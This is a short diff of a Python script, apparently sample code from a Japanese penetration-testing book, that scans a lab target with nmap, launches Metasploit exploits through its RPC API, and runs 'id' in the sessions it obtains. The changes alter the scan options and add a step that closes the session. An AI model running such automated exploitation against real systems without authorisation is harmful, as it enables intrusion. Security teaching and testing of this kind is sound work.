@@ -71,7 +71,7 @@ console_id = ret.get(b'id')
 import time
 
 # Nmapオプション
-nmap_option = "-Pn -sT -A -r --initial-rtt-timeout 300ms --min-rtt-timeout 200ms --max-rtt-timeout 1000ms --max-scan-delay 200ms --max-retries 3"
+nmap_option = "-Pn -sS -A -r --max-retries 3"
 # ターゲットサーバのIPアドレス
 rhost = "192.168.220.145"
 
@@ -288,6 +288,9 @@ for idx, prod_name in enumerate(service_list):
                                     _ = call('session.shell_write', [str(session_id), 'id\n'])
                                     ret = call('session.shell_read', [str(session_id), 0])
                                     print(ret[b'data'].decode('utf-8'))
+
+                                    # セッションの破棄
+                                    _ = call('session.stop', [str(session_id)])
                                 else:
                                     # meterpreterやpowershellなどのセッションを利用した処理を記述
                                     # 本書では割愛しますm(_ _)m
